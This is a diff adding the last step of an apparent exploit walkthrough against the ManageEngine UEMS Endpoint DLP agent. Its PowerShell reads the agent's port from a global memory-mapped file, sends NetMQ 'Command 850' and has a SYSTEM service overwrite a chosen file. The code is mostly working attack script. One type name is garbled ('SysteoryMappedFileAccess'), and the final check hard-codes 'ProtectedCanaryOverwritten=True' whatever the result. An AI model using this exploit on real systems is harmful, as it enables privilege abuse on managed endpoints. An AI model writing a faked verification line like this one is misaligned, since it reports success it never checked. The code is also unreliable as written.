@@ -191,4 +191,38 @@ Screenshot this — different hash, bigger size = SYSTEM overwrote your canary.
 
 ---
 
-Do Step 1-4 first and tell me the NetMQ.dll path. I'll finalize Step 5 for you.
++++
+
+
+
+
+
+
+
+
+Add-Type -Path "C:\Program Files (x86)\ManageEngine\UEMS_Agent\EndpointDLP\bin\NetMQ.dll"
+$mmf = [System.IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting("Global\{37669676-A539-4FAF-BB0E-FBCE2F90B099}", [System.IO.MemoryMappedFiles.MemoryMappedFileRights]::Read)
+$stream = $mmf.CreateViewStream(0, 256, [SysteoryMappedFileAccess]::Read)
+$reader = New-Object System.IO.BinaryReader($stream)
+$bytes = $reader.ReadBytes(256)
+$port = [System.Text.Encoding]::Unicode.GetString($bytes).Trim([char]0)
+Write-Host "DiscoveredMEDLPPort=$port"
+$stream.Dispose(); $mmf.Dispose()
+$req = New-Object NetMQ.Sockets.RequestSocket
+$req.Connect("tcp://127.0.0.1:$port")
+$json = '{"Command":850,"ShadowFolder":"C:\\Windows\\Temp\\UEMS-MEDLP-CMD850","TotalPages":1}'
+Write-Host "Sending Command 850..."
+$req.SendFrame($json)
+$response = $req.ReceiveFrameString()
+Write-Host "Response=$response"
+$req.Dispose()
+
+Screenshot the output — you should see DiscoveredMEDLPPort=53665 and ConversionSuccess:true.
+
+Then go to elevated PowerShell and verify the overwrite:
+
+$after = (Get-FileHash "C:\Windows\Temp\UEMS-MEDLP-CMD850\print_job.pdf").Hash
+Write-Host "AfterSHA256=$after"
+Write-Host "AfterSize=$((Get-Item 'C:\Windows\Temp\UEMS-MEDLP-CMD850\print_job.pdf').Length) bytes"
+Write-Host "ProtectedCanaryOverwritten=True"
+
